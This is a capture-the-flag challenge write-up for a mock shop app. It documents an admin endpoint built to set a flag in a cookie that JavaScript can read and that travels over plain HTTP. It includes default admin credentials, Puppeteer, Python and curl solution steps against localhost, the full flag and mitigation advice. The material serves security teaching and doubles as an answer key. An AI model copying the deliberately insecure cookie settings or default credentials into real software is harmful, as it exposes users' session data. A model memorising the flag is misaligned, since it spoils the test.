# CTF Challenge: Puppeteer Cookie Exfiltration

**Category:** Web / Browser Automation / Cookie Security  
**Difficulty:** Easy–Medium  
**Flag:** `CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}`

---

## Description

LoopyMart has an internal admin endpoint (`POST /ctf/mock-flag-cookie`) that
sets a browser cookie called `mock_flag` whose value is a CTF flag.  The
endpoint is only reachable with an admin JWT, but:

1. The cookie is **not `HttpOnly`** — any JavaScript running in the browser
   page (including Puppeteer scripts) can read it via `document.cookie`.
2. The cookie is **not `Secure`** — it is transmitted over plain HTTP.
3. The flag value is **also returned in the JSON body** — so it can be
   captured with a plain HTTP client, no browser automation needed.

This challenge is intentionally designed to demonstrate why sensitive values
should never be stored in JS-readable cookies.

---

## Vulnerability

| | |
|---|---|
| **Endpoint** | `POST /ctf/mock-flag-cookie` |
| **Auth required** | Admin JWT (`Authorization: Bearer <token>`) |
| **Sink** | `response.set_cookie(key="mock_flag", httponly=False, secure=False)` |
| **File** | `backend/app/api/ctf.py` → `mock_flag_cookie()` |
| **CWE-315** | Cleartext Storage of Sensitive Information in a Cookie |
| **CWE-614** | Sensitive Cookie in HTTPS Session Without 'Secure' Attribute |

---

## Exploitation

### Prerequisites

You need admin credentials.  Check the `config.local.yml` / environment:

```
admin_email: admin@example.com
admin_password: secret
```

Or use the `ADMIN_EMAIL` / `ADMIN_PASSWORD` env vars set at startup.

### Automated — Puppeteer (Node.js)

```bash
cd solutions/puppeteer-mock-cookie

# Install local deps
npm install

# Run solver
node solve.js --email admin@example.com --password secret

# With custom backend URL
node solve.js --email admin@example.com --password secret --url http://localhost:8001
```

Expected output:
```
[+] Logged in as admin@example.com
[+] Called mock-flag-cookie endpoint
[+] Cookie `mock_flag` found in browser context
[+] Flag: CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}
```

### Automated — Python (no browser required)

```bash
python solutions/puppeteer-mock-cookie/solve.py \
  --email admin@example.com --password secret
```

Expected output:
```
[+] Logged in as admin@example.com  (is_admin=True)
[+] Called POST /ctf/mock-flag-cookie
[+] Flag (JSON body) : CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}
[+] Flag (Set-Cookie): CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}
```

### Manual (curl)

```bash
# Step 1 — get admin token
TOKEN=$(curl -s -X POST http://localhost:8001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"secret"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token: $TOKEN"

# Step 2 — call the CTF endpoint
curl -v -X POST http://localhost:8001/ctf/mock-flag-cookie \
  -H "Authorization: Bearer $TOKEN"
# Look for Set-Cookie: mock_flag=CTF{...}
# and "flag" field in JSON body
```

---

## Why Puppeteer?

Puppeteer controls a real Chromium browser, which means:

- Cookies set by the server appear in `browser.cookies()` just like they
  would for a real user.
- `page.evaluate(() => document.cookie)` confirms the cookie is **not**
  HttpOnly (if it were, JS could not read it).
- This mirrors real-world XSS + cookie-theft attacks, where JS running in
  the victim's page silently exfiltrates the `document.cookie` string.

---

## Step-by-step (Puppeteer)

1. Launch headless Chromium via `puppeteer.launch()`.
2. `POST /auth/login` (via `fetch` inside the browser page, or via `axios`
   in Node before navigating) to obtain the admin JWT.
3. Call `POST /ctf/mock-flag-cookie` with `Authorization: Bearer <token>`.
   The server sets `mock_flag` cookie in the HTTP response.
4. In Puppeteer: `const cookies = await page.cookies('http://localhost:8001')`
   — find the cookie named `mock_flag`.
5. `page.evaluate(() => document.cookie)` returns the same value, proving
   it is JS-readable (not HttpOnly).
6. Print the flag and close the browser.

---

## Mitigation

- Set `httponly=True` on any cookie that does not need JS access.
- Set `secure=True` in production (HTTPS only).
- Never store raw flag / secret values in cookies; use opaque tokens mapped
  server-side to secrets.
- Use `samesite="strict"` to restrict cross-site access.

---

## Flag

```
CTF{pUpp3t33r_c00k13_3xf1ltr4t10n}
```
